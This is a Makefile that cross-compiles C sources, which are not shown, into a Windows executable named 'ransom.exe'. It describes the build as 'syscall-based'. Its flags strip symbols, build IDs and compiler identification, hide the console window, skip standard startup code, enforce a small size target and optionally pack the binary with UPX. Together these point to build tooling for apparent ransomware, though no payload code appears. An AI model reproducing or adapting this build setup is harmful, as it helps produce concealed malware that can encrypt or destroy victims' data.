# Cross-platform executable builder Makefile
# Targets Windows x64 with syscall-based implementation

CC = x86_64-w64-mingw32-gcc
STRIP = x86_64-w64-mingw32-strip
OBJCOPY = x86_64-w64-mingw32-objcopy

# Compiler flags for minimal, optimized executable
CFLAGS = -Wall -Wextra -std=c99 -Os -s -static -Wl,--gc-sections -Isrc \
         -fno-stack-protector \
         -fno-unwind-tables \
         -fno-asynchronous-unwind-tables \
         -ffunction-sections \
         -fdata-sections \
         -fno-ident \
         -fno-math-errno \
         -fmerge-all-constants

# Linker flags for size optimization
LDFLAGS = -Wl,--gc-sections \
          -Wl,--strip-all \
          -Wl,--build-id=none \
          -static \
          -static-libgcc \
          -static-libstdc++ \
          -mwindows \
          -nostartfiles

# Source files
SRCDIR = src
BUILD_DIR ?= build
SOURCES = $(wildcard $(SRCDIR)/*.c)
OBJECTS = $(SOURCES:$(SRCDIR)/%.c=$(BUILD_DIR)/%.o)
TARGET = $(BUILD_DIR)/ransom.exe

# Default target
all: $(TARGET)

# Create build directory
$(BUILD_DIR):
	mkdir -p $(BUILD_DIR)

# Compile object files
$(BUILD_DIR)/%.o: $(SRCDIR)/%.c | $(BUILD_DIR)
	$(CC) $(CFLAGS) -c $< -o $@

# Link executable
$(TARGET): $(OBJECTS) | $(BUILD_DIR)
	$(CC) $(LDFLAGS) $^ -o $@
	$(STRIP) --strip-all $@

# Clean build artifacts
clean:
	rm -rf $(BUILD_DIR)

# Install build dependencies (Ubuntu/Debian)
install-deps:
	sudo apt-get update
	sudo apt-get install -y mingw-w64 upx-ucl

# Test compilation
test: $(TARGET)
	@echo "Executable size: $$(stat -c%s $(TARGET)) bytes"
	@echo "Target size range: 150-200KB (153600-204800 bytes)"
	@if [ $$(stat -c%s $(TARGET)) -gt 204800 ]; then \
		echo "WARNING: Executable exceeds 200KB target"; \
	elif [ $$(stat -c%s $(TARGET)) -lt 153600 ]; then \
		echo "SUCCESS: Executable under 150KB"; \
	else \
		echo "SUCCESS: Executable within target range"; \
	fi

# Pack with UPX (optional)
pack: $(TARGET)
	upx --best --lzma $(TARGET) || echo "UPX not available, skipping compression"

.PHONY: all clean install-deps test pack
